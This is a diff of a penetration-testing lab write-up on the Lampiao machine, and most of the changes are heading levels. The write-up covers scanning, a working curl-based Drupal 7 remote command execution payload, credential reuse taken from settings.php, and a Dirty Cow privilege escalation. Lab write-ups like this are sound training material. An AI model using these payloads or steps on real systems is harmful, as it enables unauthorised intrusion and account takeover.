@@ -2,14 +2,14 @@
 title: OffSec PG - Lampiao
 date: 2021-12-19 12:00:00 +0500
 categories: [Lab Practice Notes, OffSec Proving Grounds]
-tags: [oscp,proving-grounds,security,lab]
+tags: [oscp,lab]
 ---
 
-# Enumeration
+## Enumeration
 
 Machine IP &rarr; `192.168.56.48`
 
-## Network Scan
+### Network Scan
 
 Nmap scan &rarr; `nmap -A -Pn -p- -T4 -o nmap.txt 192.168.56.48`
 
@@ -21,7 +21,7 @@ OS Detection &rarr;  `OS: Linux; CPE: cpe:/o:linux:linux_kernel`
 | 80       | HTTP?       | \-                                                              |
 | 1898     | HTTP        | Apache httpd 2.4.7 ((Ubuntu)) & Drupal 7                        |
 
-## Web Scan
+### Web Scan
 
 Robots.txt check by nmap listed a ton of directories and files for all user agents. Therefore, listed the entire file using curl, which resulted in the following interesting entries &rarr;
 
@@ -52,7 +52,7 @@ Directories/files listed were common with robots.txt finding and the important o
 
 ---
 
-# Exploitation
+## Exploitation
 
 Nothing in the directory and file brute force was particularly interesting. The /CHANGELOG.txt file can be looked at to identify the exact version of software running on the server. This revealed the latest version to be Drupal 7.54.
 
@@ -68,7 +68,7 @@ Renderable arrays are implemented by an associative array and pass key-value pai
 To exploit, the following set of 2 commands can be executed to get the result of a bash command on the server &rarr;
 
 ```
-# 1st command - payload is "which nc" to check if nc is there on the system.
+## 1st command - payload is "which nc" to check if nc is there on the system.
 url_pre="http://192.168.56.48:1898/?q=user/password&name"
 url_post="$url_pre\[%23post_render\]\[\]=passthru&name\[%23type\]=markup&name\[%23markup\]="
 final_url="$url_post=which+nc"
@@ -76,7 +76,7 @@ form_data=$( curl -k -s $(echo final_url) --data "form_id=user_pass&_triggering_
 form_build=$(echo form_data | grep form_build_id)
 form_build_id=$(echo form_build | sed -E 's/.*name="form_build_id" value="(.*)".*/\1/' )
 
-# 2nd command, which returns the result of the above payload.
+## 2nd command, which returns the result of the above payload.
 curl -k -i "http://192.168.56.48:1898/?q=file/ajax/name/%23value/${form_build_id}" \
     --data "form_build_id=${form_build_id}"
 ```
@@ -87,15 +87,15 @@ However, an nc shell did not work. It is known that there is php on the system. 
 
 ---
 
-# Privilege Escalation
+## Privilege Escalation
 
-## User
+### User
 
 Looking at `/etc/passwd`, a number of users are determined. SetUID binaries do not have any interesting information. The `/etc/passwd` contains the hashed password for the `root` user. This was sent to john for a cracking attempt, which did not reveal anything.
 
 Listing the `/home` directory shows the presence of a user `tiago`. Google-fu for default drupal config files reveals the location as `settings.php` file inside the `sites/default/` directory. This reveals the mysql database connection credentials as `drupaluser:Virgulino`. Trying the password for the user `tiago` successfully logs in. This gives the user flag.
 
-## Root
+### Root
 
 The `tiago` user is not allowed to run sudo either. Therfore, looking at other information and running the linux enumeration script. Looking at the kernel version, which is 4.4.0, Google-fu points to the presence of the Dirty Cow exploit.
 
